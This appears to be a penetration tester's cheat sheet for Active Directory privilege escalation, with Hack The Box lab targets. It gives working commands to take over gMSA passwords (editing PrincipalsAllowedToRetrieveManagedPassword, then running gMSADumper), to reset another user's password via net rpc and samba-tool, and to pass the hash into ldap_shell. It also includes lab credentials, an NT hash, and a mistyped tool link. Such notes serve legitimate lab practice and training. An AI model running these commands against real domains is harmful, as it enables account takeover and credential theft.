...
## Client Authentication (Enroll rights)
Let's say you found a user with enroll rights on the Client Authentication group. This user can enroll client authentication certifications if the template doesn't require manager approval or authentication using a Smartcard and AD CS is accessible.  
https://github.com/GhostPack/Certify
[[Client Authentication AD CS]]

### Group Managed Service accounts
As a member of a group managed service accounts group, this could indicate that the user has rights over the msDS-ManagedPassword, this is stored in the msDS-ManagedPassword attribute of Active Directory. This can be obtained through multiple forms:
- NTLM Relay Attack: Exploiting a vulnerability in the NTLM protocol, an attacker can relay an NTLM authentication request to an LDAP or LDAPS service, which in turn can access the msDS-ManagedPassword attribute to obtain a gMSA password. 
- Golden gMSA attack: If an attacker has access to the Key Distribution Service (KDS) root key attribute, they can generate all associated gMSA password offline. This is referred to as the "golden gMSA" attack, and allows an attacker to continuously obtain password for gMSA without triggering password changes or accessing logs. 
	https://github.com/micahvandeusen/gMSADumper
	Check type of account `Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass`
	Check who can retrieve managed password: `Get-ADServiceAccount -Identity "Haze-IT-Backup$" -Properties PrincipalsAllowedToRetrieveManagedPassword`
	Add yourself if part of gMSA Admin groups: `Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"` 
	Then use gMSADumper.py: `python gMSADumper.py -u 'mark.adams' -p 'P@ssw0rd' -d haze.htb -l dc01.haze.htb`
	There can be a time constraint on this group so be sure to execute the commands relatively fast after each other
...
### WriteOwner on Group
Add your user as owner of the group: 
...
net rpc password "adam.silver" -U "PUPPY.HTB"/"ant.edwards"%"Antman2025 -S "10.10.11.70"

samba-tool user setpassword adam.silver --newpassword='PoellieWasHereLel' -H ldap://10.10.11.70 -U"ant.edwards%Antman2025!"
...
#### Kerberoasting after valid credentials (GenericWrite)

https://Igithub.com/ShutdownRepo/targetedKerberoast/tree/main
...
```
ldap_shell haze.htb/Haze-IT-Backup\$ -hashes ffffffffffffffffffffffffffffffff:84d6a733d85d9e03f46eba25b34517a9
```